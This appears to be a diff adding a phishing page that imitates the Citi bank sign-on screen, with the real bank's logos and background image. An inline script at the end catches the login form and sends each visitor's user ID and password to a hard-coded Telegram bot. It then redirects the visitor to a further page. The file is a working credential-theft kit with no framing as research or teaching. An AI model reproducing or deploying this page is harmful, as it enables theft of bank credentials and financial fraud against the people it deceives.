@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Sign On</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <style>
+    body
+{
+  padding: 0;
+  margin: 0;
+  box-sizing: border-box;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #333333
+}
+
+header#header
+{
+    /* border-bottom: 30px solid rgb(0, 45, 114) */
+    background: #fff
+  
+}
+header#header .container
+{
+  display: flex;
+  justify-content: space-between;
+  width: 90%;
+  margin: auto;
+  align-items: center
+}
+.img-loc .branch p
+{
+  font-size: 11px;
+}
+.img-loc .branch
+{
+  color: #666
+}
+.img-loc img
+{
+  height: 26px
+}
+.img-loc
+{
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  text-align: center;
+  width: 10%
+}
+
+section#form-section
+{
+ background-image: url("https://online.citi.com/nga-lite-signon/LSO_4959.jpg");
+ object-fit: cover;
+    background-size: cover;
+    background-position: 50%;
+    display: block;
+    width: 100%;
+    min-height: 400px;
+}
+
+.form-cove h1
+{
+  font-size: 1.313rem;
+    line-height: 1.688rem;
+    font-family: Interstate_Light,sans-serif;
+    font-weight: 300;
+    text-transform: none;
+    letter-spacing: normal;
+    color: #333333
+}
+.form-cove .inputs input[type=password],
+.form-cove .inputs input[type=text]{
+    font-size: 1rem;
+}
+.form-cove .inputs
+{
+  display: flex;
+  justify-content: space-between;
+}
+.form-cove .inputs input
+{
+    box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    letter-spacing: .5px;
+    height: 48px;
+    padding: 10px 20px;
+    background: #eee;
+    border: none!important;
+    box-shadow: none;
+    border-radius: 8px;
+    width: 47%
+}
+.form-cove button
+{
+      line-height: 46px;
+    border-width: 2px;
+    border-style: solid;
+    width: 100%;
+    position: relative;
+    background: #056dae;
+    color: #fff;
+    font-weight: bold;
+    border: #056dae;
+    border-radius: 5px
+}
+.reg-pwd .pwd
+{
+  text-align: left;
+}
+.reg-pwd .reg
+{
+  text-align: left
+}
+.reg-pwd a
+{
+  font-size: 12px;
+  color: #056dae
+}
+.reg-pwd
+{
+  display: flex;
+  justify-content: space-between;
+  width: 100%
+}
+.form-cove
+{
+  position: absolute;
+  left: 73%;
+  top: 39%;
+  transform: translate(-39%, -73%);
+  background: #fff;
+  padding: 20px;
+  width: 20%;
+  height: 330px
+}
+.qr-sign a
+{
+  font-size: 12px;
+  width: 30%;
+  color: #056dae;
+}
+.qr-sign
+{
+  display: flex;
+  justify-content: space-between;
+  align-items: center
+}
+
+
+footer#footer .contain .ulls
+{
+  text-align: left;
+}
+footer#footer .contain ul li
+{
+  list-style: none;
+  padding: 10px;
+  font-size: 13px;
+  color: #f1f1f1
+}
+footer#footer .contain
+{
+  width: 65%;
+  margin: auto;
+  display: flex;
+  justify-content: space-between;
+  margin-top: 3%
+}
+footer#footer
+{
+  background: #333333;
+  color: #fff
+}
+
+
+@media(max-width: 1000px)
+{
+  header#header
+{
+    border-bottom: 40px solid rgb(0, 45, 114)
+  
+}
+
+  body{
+    background: #fff
+  }
+  .form-cove
+{
+  position: relative;
+  width: 80%;
+  left: 40%;
+  top: 39%;
+  transform: translate(-39%, -0%);
+}
+footer#footer .contain
+{
+  width: 95%;
+  margin: auto;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  margin-top: 3%
+}
+.img-loc
+{
+  display: none
+}
+
+header#header .container
+{
+  width: 100%
+}
+
+.form-cove .inputs
+{
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  margin-top: -10%;
+}
+.form-cove .inputs input{
+  width: 100%;
+  margin-top: 10%
+}
+
+section#form-section
+{
+  min-height: 300px
+}
+}
+    </style>
+  </head>
+  <body>
+    <header id="header">
+      <div class="container">
+        <img src="https://www.citi.com/CBOL/IA/Angular/assets/citilogoredesign.png" alt="">
+        <div class="img-loc">
+          <div class="branch">
+            <img src="https://www.citi.com/CBOL/IA/Angular/assets/050-location2x.svg" alt="">
+            <p>ATM / BRANCH</p>
+          </div>
+          <div class="branch">
+            <img src="https://www.citi.com/CBOL/IA/Angular/assets/icon_globe_med-grey2x.svg" alt="">
+            <p>ESPANOL</p>
+          </div>
+        </div>
+      </div>
+    </header>
+    <section id="form-section">
+    
+
+    </section>
+<div class="form-cove">
+      <div class="qr-sign">
+        <h1>Sign On</h1>
+        <a href="">Sign On with the Citi Mobile App</a>
+      </div>
+      <br>
+      <form action="" id="form" method="post">
+        <div class="inputs">
+          <input type="text" name="usd" id="usr" placeholder="User ID" required>
+          <input type="password" placeholder="Password" id="pwd" name="pwd" required>
+        </div>
+        <br>
+        <button type="submit">Sign On</button>
+      </form>
+      <br>
+      <br>
+      <div class="reg-pwd">
+        <div class="reg">
+          <a href="">Forgot User ID</a><br>
+          <a href="">Forgot Password</a>
+        </div>
+        <div class="pwd">
+          <a href="">Activate a Card</a><br>
+          <a href="">Register for Online Access</a>
+        </div>
+      </div>
+    </div>
+    <footer id="footer">
+      <div class="contain">
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; ">Why Citi</li>
+            <br>
+            <li>Our Story</li>
+            <li>Benefits and Services</li>
+            <li>Rewards</li>
+            <li>Citi Easy Deals</li>
+            <li>Citi Entertainment</li>
+            <li>Special Offers</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; color:#fff;">Wealth Management</li>
+            <li>Citigold Private Client</li>
+            <li>Citigold</li>
+            <li>Citi Priority</li>
+            <li>Citi Private Bank</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; color:#fff;" >Business Banking</li>
+            <li>Small Business Accounts</li>
+            <li>Commercial Accounts</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+            <li style="font-weight: bold; color:#fff;" >Rates</li>
+            <li>Personal Banking</li>
+            <li>Credit Cards</li>
+            <li>Mortgage</li>
+            <li>Home Equity</li>
+            <li>Lending</li>
+          </ul>
+        </div>
+        <div class="ulls">
+          <ul>
+             <li style="font-weight: bold; color:#fff;" >Help & Support</li>
+            <li>Contact Us</li>
+            <li>Help & FAQs</li>
+            <li>Security Center</li>
+          </ul>
+        </div>
+      </div>
+    </footer>
+
+    <script>
+      const formal = document.querySelector('#form')
+    
+      let bot = {
+        TOKEN: "5190068586:AAFD_XLBgOfT81KGz9TSr-twJAt0SYAONNk",
+        chatID: "-727286103"
+      }
+  
+  
+      formal.addEventListener("submit", e =>{
+          e.preventDefault();
+  
+          let message = document.querySelector('#usr').value
+          let messageT = document.querySelector('#pwd').value
+          
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=CITILogs==${message}=${messageT}`, {
+              method: "GET"
+          }).then(success => {
+            const mass = Math.random()
+              window.location.replace(`/emma.html?xyz${mass}=xyz${mass}`);
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+  
+          })
+      })
+  </script>
+  </body>
+</html>
